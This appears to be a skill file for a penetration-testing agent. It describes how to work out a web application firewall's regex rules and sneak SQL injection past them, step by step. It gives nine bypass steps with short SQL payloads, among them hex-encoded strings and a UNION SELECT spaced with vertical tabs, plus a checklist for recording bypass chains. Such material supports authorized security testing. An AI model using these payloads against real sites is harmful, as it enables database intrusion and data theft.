---
name: waf-regex-reversing
description: Skill for reverse-engineering WAF regex rules by progressively testing blocked keywords and finding equivalent alternatives. Uses SQLi as the primary example but applicable to all injection types. Built from the Awesome-WAF knowledge base.
sources: github
report_count: 10
---

# WAF Regex Reversing

## Crown Jewel Targets

- WAFs that return informative block messages
- WAFs with progressive keyword blocking
- Applications where error messages reveal blocked characters

## Attack Surface Signals

- Block messages change when different keywords are used
- Certain SQL/JS keywords pass while equivalent ones are blocked
- Error messages leak which pattern triggered the block

## Step-by-Step Methodology

Progressive SQLi keyword bypass through 9 steps:

### Step 1: `and|or|union` filtered
Use pipe operators instead:
```sql
1 || (select 1 from dual)
```

### Step 2: `where` filtered
Use `limit` clause instead:
```sql
select 1 from users limit 1
```

### Step 3: `limit` filtered
Use `group by ... having`:
```sql
select 1 from users group by 1 having 1=1
```

### Step 4: `group by` filtered
Nest functions:
```sql
substr(group_concat(table_name),1,1)
```

### Step 5: `select` filtered
Use `into outfile` or alternative constructions:
```sql
substr(...,1,1)
```

### Step 6: `'` (single quote) filtered
Use hex encoding:
```sql
0x61646D696E
unhex('61646D696E')
```

### Step 7: `hex` filtered
Use conv/lower for string generation:
```sql
lower(conv(11,10,36))  -- produces 'b'
```

### Step 8: `substr` filtered
Use alternative string functions:
```sql
lpad(user,7,1)
```

### Step 9: `white space` filtered
Use vertical tab or other whitespace:
```sql
1%0bUNION%0bSELECT%0b1,2,3--
```

## General Methodology

1. Identify one keyword being filtered at a time
2. Research equivalent syntax that achieves the same result
3. Test the alternative
4. If blocked, iterate with the next alternative
5. Document the full bypass chain for future reference

## Common Root Causes

- WAF regex rules target specific keywords but miss synonyms
- Progressive filtering creates a bypass map of "what works"
- SQL/JS language provides many equivalent constructs
- Each filtering level reveals information about the regex pattern

## Gate 0 Validation

- [ ] Have I identified which specific keyword is being filtered?
- [ ] Have I found an equivalent alternative?
- [ ] Have I documented the bypass chain?
- [ ] Is the bypass reproducible?
